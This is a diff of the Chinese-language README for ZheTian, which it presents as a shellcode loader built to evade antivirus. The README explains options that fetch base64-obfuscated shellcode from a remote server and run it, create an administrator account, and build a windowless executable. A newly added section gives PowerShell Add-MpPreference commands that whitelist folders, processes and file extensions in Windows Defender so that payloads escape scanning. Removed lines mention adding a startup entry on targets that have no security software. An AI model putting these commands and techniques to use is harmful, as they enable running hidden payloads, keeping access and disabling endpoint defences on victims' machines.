@@ -2,30 +2,22 @@
 
 # [ZheTian](https://github.com/yqcs/ZheTian/)
 
-## ZheTian Powerful remote load and execute ShellCode tool，免杀shellcode加载框架
+## ZheTian Powerful remote load and execute ShellCode tool，ShellCode免杀加载器
 
-### 命令详解
+### 命令：
 
-> -u  string：从远程服务器加载base64混淆后的字节码。
+> -u  string：从远程服务器加载base64混淆后的字符串。
 >
 > -r string：从本地文件内读。
 >
 > -s string：读取无修改的原始文件，只能从本地加载。
 >
->-o boolean：向userHome\tmp目录输出一次性可执行文件，体积比主程序小了五六倍，同理砍去了其他功能，只保留了ShellCode Loader
+>-o boolean：向userHome\tmp目录输出一次性可执行文件，体积比主程序小了五六倍，砍去了其他功能，只保留了ShellCode Loader
 >
 >-n string：向管理员组创建用户，-n的参数即为账户，-p的参数为密码。需以管理员身份运行
 >
 >-c string：直接从命令行获取base64字符串。如：ZheTian -c ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M==...
 >
-
-## `·`如果releases里下载的可执行程序被安全软件查杀了，请下载源码重新编译一份！`·`
-
-## 新增命令-o详解：
-
-> 该命令主要是向用户目录下创建tmp文件夹，然后生产只包含shellcode的程序，体积小了五六倍，极致压缩，并且无任何回显。由于ShellCode写死在了程序内，所以导致用一段时间就会被查杀。
->
-> 注意使用该命令需填充shellcode，同时拥有go环境。搭配-s、-u、-c、-r其中的任意命令即可，如：ZheTian -s payload.c -o=true
 
 ## 示例：
 
@@ -61,10 +53,8 @@ ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==
 
 ![my-logo.png](https://github.com/yqcs/ZheTian/blob/master/images/payload.jpg "my-logo")
 
-
 然后根据需要的命令进行修改
 ![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/code.png "my-logo")
-
 
 下面执行示例：
 ![my-logo.png](https://github.com/yqcs/ZheTian/blob/master/images/c.png "my-logo")
@@ -76,7 +66,7 @@ ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==
 可以使用
 > go build -ldflags "-w -s -H windowsgui" -o ZheTian.exe
 
-实现无窗口运行。但是360偶尔会识别为恶意程序。如果目标机器无安全设备，可以尝试使用此命令打包，然后使用参数： ` -o true` 实现写入启动项功能。
+实现无窗口运行，但是360偶尔会识别为恶意程序
 
 #### 带图标编译：
 
@@ -88,9 +78,18 @@ ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==
 >
 > 更多介绍：https://blog.csdn.net/qq_38376348/article/details/108318880
 >
-![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/1.png "my-logo")
 
-### 注意：打包的时候需指定是64位还是32位。默认会根据系统自动选择。 而在生成payload shellcode的时候也需要选择正确的位数，否则会加载失败。使用code字节码加载时一定要使用base64加密，否则无法解析！！
+## 扩展：windows defender
+
+由于ZheTian的defender免杀效果不稳定，在此推荐一种方式，执行下面命令会分别向defender添加白名单：目录、进程、类型文件
+####需以管理员权限运行
+
+> powershell -Command Add-MpPreference -ExclusionPath "C:\tmp"
+>
+>powershell -Command Add-MpPreference -ExclusionProcess "java.exe"
+>
+>powershell -Command Add-MpPreference -ExclusionExtension ".java"
+>
 
 ## 有问题可以提Issues，也可加微信联系
 
